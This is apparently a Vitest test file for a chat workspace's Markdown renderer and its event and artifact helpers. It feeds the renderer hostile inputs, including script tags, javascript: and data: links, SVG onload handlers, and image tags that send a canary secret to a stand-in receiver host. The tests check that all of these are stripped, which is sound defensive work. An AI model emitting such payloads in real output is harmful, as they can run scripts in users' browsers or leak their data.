import { expect, it } from 'vitest';
import { createRequire } from 'node:module';
const webRequire = createRequire(new URL('../apps/web/package.json', import.meta.url));
const { createElement } = webRequire('react');
const { renderToStaticMarkup } = webRequire('react-dom/server');
import { ResponseMarkdown } from '../apps/web/src/components/workspace/ResponseMarkdown';
import { chatArtifacts, progressMessage } from '../apps/web/src/lib/chat-evidence';
import { newId, type RunEvent, type RunSnapshot } from '../packages/contracts/src';

it('formats Markdown while rejecting raw HTML, unsafe URLs and remote image loads', () => {
  const html = renderToStaticMarkup(createElement(ResponseMarkdown, { content: '# Answer\n\n**Important** and *emphasis*.\n\n- First\n- Second\n\n```js\nconst value = "**literal**";\n```\n\n| Name | Value |\n| --- | --- |\n| A | B |\n\n<script>alert(1)</script>\n\n[bad](javascript:alert%281%29)\n\n![tracking](https://example.invalid/pixel)' }));
  expect(html).toContain('<h1>Answer</h1>');
  expect(html).toContain('<strong>Important</strong>');
  expect(html).toContain('<em>emphasis</em>');
  expect(html).toContain('<li>First</li>');
  expect(html).toContain('**literal**');
  expect(html).toContain('<table>');
  expect(html).not.toContain('<script');
  expect(html).not.toContain('href="javascript:');
  expect(html).not.toContain('<img');
});

it.each([
  '<img src="https://receiver.invalid/collect?secret=canary" onerror="alert(1)">',
  '<iframe src="https://receiver.invalid"></iframe>',
  '<svg onload="alert(1)"></svg>',
  '[open](javascript:alert%281%29)',
  '[open](data:text/html;base64,PHNjcmlwdD4=)',
  '![tracking][pixel]\n\n[pixel]: https://receiver.invalid/collect?secret=canary',
])('renders hostile output without executable markup or automatic fetch elements: %s', content => {
  const html = renderToStaticMarkup(createElement(ResponseMarkdown, { content }));
  expect(html).not.toMatch(/<(?:img|iframe|svg|script)\b/i);
  expect(html).not.toMatch(/(?:src|onerror|onload)=/i);
  expect(html).not.toMatch(/href="(?:javascript|data):/i);
});

it('only final task outputs from current attempts appear as chat responses', () => {
  const first = newId('task'), last = newId('task');
  const old = newId('exec'), current = newId('exec'), research = newId('exec');
  const artifacts = [research, old, current].map(producerExecutionId => ({ id: newId('artifact'), producerExecutionId }));
  const snapshot = { tasks: { [first]: { declaredDeps: [] }, [last]: { declaredDeps: [first] } }, executions: { [research]: { id: research, taskId: first }, [old]: { id: old, taskId: last }, [current]: { id: current, taskId: last } }, latestExecutionByTask: { [first]: research, [last]: current }, artifacts: Object.fromEntries(artifacts.map(artifact => [artifact.id, artifact])) } as unknown as RunSnapshot;
  expect(chatArtifacts(snapshot)).toEqual([artifacts[2]]);
});

it('suppresses routine events but surfaces blocked actions and real completion', () => {
  expect(progressMessage({ type: 'graph.projected', payload: {} } as RunEvent)).toBeNull();
  expect(progressMessage({ type: 'tool.decided', payload: { decision: 'ALLOW' } } as RunEvent)).toBeNull();
  expect(progressMessage({ type: 'tool.decided', payload: { decision: 'DENY' } } as RunEvent)).toContain('blocked');
  expect(progressMessage({ type: 'run.status_changed', payload: { to: 'FAILED' } } as RunEvent)).toContain('stopped');
});
